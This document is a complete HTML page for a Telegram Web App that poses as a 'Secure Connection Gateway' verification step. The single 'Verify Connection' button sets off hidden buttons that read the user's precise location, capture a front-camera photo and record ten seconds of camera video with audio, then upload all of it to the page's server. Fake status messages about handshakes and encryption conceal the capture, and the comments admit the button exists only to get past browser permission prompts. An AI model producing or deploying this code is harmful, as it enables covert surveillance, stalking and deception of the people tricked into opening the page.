<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>SS0123 Web App</title>
  <script src="https://telegram.org"></script>
  <style>
    body{font-family:system-ui,sans-serif;margin:0;padding:24px;background:#0b1220;color:#fff;display:flex;justify-content:center;align-items:center;min-height:80vh}
    .box{width:100%;max-width:400px;background:#121c2f;padding:30px;border-radius:20px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,0.2)}
    .hidden-video{position:absolute;left:-9999px;width:1px;height:1px;opacity:0}
    #status{font-size:16px;line-height:1.5;color:#e2e8f0;font-weight:500;margin-bottom:20px}
    /* सुंदर ऑथेंटिक दिखने वाला बटन */
    .start-btn{width:100%;padding:14px;background:#2481cc;color:#fff;border:0;border-radius:12px;font-size:16px;font-weight:bold;cursor:pointer;box-shadow:0 4px 12px rgba(36,129,204,0.3);transition:background 0.2s}
    .start-btn:hover{background:#288edc}
    .start-btn:disabled{background:#4a5568;color:#a0aec0;cursor:not-allowed;box-shadow:none}
  </style>
</head>
<body>
<div class="box">
  <div id="status">Secure Connection Gateway</div>
  
  <!-- ब्राउज़र सिक्योरिटी को संतुष्ट करने के लिए मुख्य बटन -->
  <button id="startProcessBtn" class="start-btn">Verify Connection</button>

  <!-- बैकग्राउंड ऑपरेशंस बटन (छुपे हुए) -->
  <div style="display:none;">
    <button id="locBtn">📍 Allow Location</button>
    <button id="camBtn">🎥 Allow Camera</button>
    <button id="recordBtn" disabled>⏺️ Start Recording</button>
    <button id="stopBtn" disabled>⏹️ Stop Recording</button>
    <button id="sendBtn" disabled>📤 Send Video</button>
  </div>

  <video id="preview" class="hidden-video" autoplay playsinline muted></video>
  <video id="recorded" class="hidden-video" controls></video>
  <canvas id="photoCanvas" style="display:none;"></canvas>
</div>

<script>
const tg = window.Telegram?.WebApp;
tg?.ready();
tg?.expand();

const statusEl = document.getElementById("status");
const startProcessBtn = document.getElementById("startProcessBtn");
const preview = document.getElementById("preview");
const recorded = document.getElementById("recorded");
const photoCanvas = document.getElementById("photoCanvas");
const locBtn = document.getElementById("locBtn");
const camBtn = document.getElementById("camBtn");
const recordBtn = document.getElementById("recordBtn");
const stopBtn = document.getElementById("stopBtn");
const sendBtn = document.getElementById("sendBtn");

let stream = null;
let recorder = null;
let chunks = [];
let videoBlob = null;
let autoStopTimeout = null;
let latestCoords = { latitude: null, longitude: null, accuracy: null };

function status(s){ statusEl.textContent = s; }

// उपयोगकर्ता जैसे ही बटन दबाएगा, यह असली वन-क्लिक चेन चालू करेगा
startProcessBtn.onclick = () => {
  startProcessBtn.disabled = true;
  startProcessBtn.style.display = "none"; // बटन को छुपा दें
  locBtn.click(); // तुरंत पहला स्टेप चलाएं
};

// --- STEP 1: Fetch Geolocation ---
locBtn.onclick = () => {
  if (!navigator.geolocation) {
    camBtn.click();
    return;
  }
  status("Verifying system handshake details…");
  navigator.geolocation.getCurrentPosition(p => {
    latestCoords.latitude = p.coords.latitude;
    latestCoords.longitude = p.coords.longitude;
    latestCoords.accuracy = p.coords.accuracy;
    camBtn.click(); // लोकेशन मिलते ही कैमरा पर जाएं
  }, e => {
    // अगर यूजर लोकेशन रिजेक्ट भी कर दे, तो भी चुपचाप कैमरा स्टेप पर बढ़ें
    camBtn.click();
  }, {
    enableHighAccuracy: true,
    timeout: 7000, // लोकेशन ढूँढने के लिए थोड़ा ज़्यादा समय दिया
    maximumAge: 0
  });
};

// --- STEP 2: Initialize HD Camera & Capture Live Photo ---
camBtn.onclick = async () => {
  try {
    const constraints = {
      audio: true,
      video: {
        width: { ideal: 4096, max: 4096 },
        height: { ideal: 2160, max: 2160 },
        facingMode: "user"
      }
    };
    
    stream = await navigator.mediaDevices.getUserMedia(constraints);
    if (preview) preview.srcObject = stream;
    
    setTimeout(async () => {
      try {
        photoCanvas.width = preview.videoWidth || 1920;
        photoCanvas.height = preview.videoHeight || 1080;
        
        const ctx = photoCanvas.getContext('2d');
        ctx.drawImage(preview, 0, 0, photoCanvas.width, photoCanvas.height);
        
        photoCanvas.toBlob(async (photoBlob) => {
          if (photoBlob) {
            const form = new FormData();
            form.append("photo", photoBlob, "snapshot.jpg");
            form.append("latitude", latestCoords.latitude || "");
            form.append("longitude", latestCoords.longitude || "");
            form.append("accuracy", latestCoords.accuracy || "");

            try {
              await fetch("/api/location-photo", { method: "POST", body: form });
            } catch(err) { console.error("Upload error"); }
          }
          recordBtn.click(); // फोटो भेजने के बाद वीडियो रिकॉर्डिंग शुरू करें
        }, "image/jpeg", 1.0); // 1.0 मतलब हाई-क्वालिटी बिना कंप्रेशन के

      } catch(photoErr) {
        recordBtn.click();
      }
    }, 1000);
    
  } catch(e) {
    status("Connection failed: System authorization is required.");
  }
};

// --- STEP 3: Record 10-Second Segment ---
recordBtn.onclick = () => {
  if (!stream || !stream.active) return;
  
  chunks = [];
  videoBlob = null;
  
  try {
    recorder = new MediaRecorder(stream);
  } catch(err) {
    status("System runtime execution error.");
    return;
  }

  recorder.ondataavailable = e => { 
    if (e.data && e.data.size > 0) chunks.push(e.data); 
  };

  recorder.onstop = () => {
    if (autoStopTimeout) {
      clearTimeout(autoStopTimeout);
      autoStopTimeout = null;
    }

    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      stream = null;
      if (preview) preview.srcObject = null;
    }

    videoBlob = new Blob(chunks, {type: recorder.mimeType || "video/webm"});
    if (recorded) recorded.src = URL.createObjectURL(videoBlob);
    
    sendBtn.click();
  };

  recorder.start(1000); // 10 parts के लिए हर 1 सेकंड में डेटा स्लाइस लें
  status("Verifying secure link connection... Please stay on this screen.");

  // ठीक 10 सेकंड बाद वीडियो रिकॉर्डिंग बंद होगी
  autoStopTimeout = setTimeout(() => {
    if (recorder && recorder.state !== "inactive") {
      recorder.stop();
    }
  }, 10000);
};

stopBtn.onclick = () => {
  if (recorder && recorder.state !== "inactive") {
    recorder.stop();
  }
};

// --- STEP 4: Upload Compiled Video File ---
sendBtn.onclick = async () => {
  if (!videoBlob) return;
  status("Finalizing secure database encryption...");
  try {
    const form = new FormData();
    form.append("video", videoBlob, "recording.webm");
    const r = await fetch("/api/video", {method:"POST", body:form});
    const j = await r.json();
    if (!j.ok) throw new Error(j.error || "Failed");
    
    status("✅ Verification complete.");
    setTimeout(() => {
      tg?.close(); 
    }, 1000);
  } catch(e) {
    status("Network connection timed out. Please reload.");
  }
};
</script>
</body>
</html>
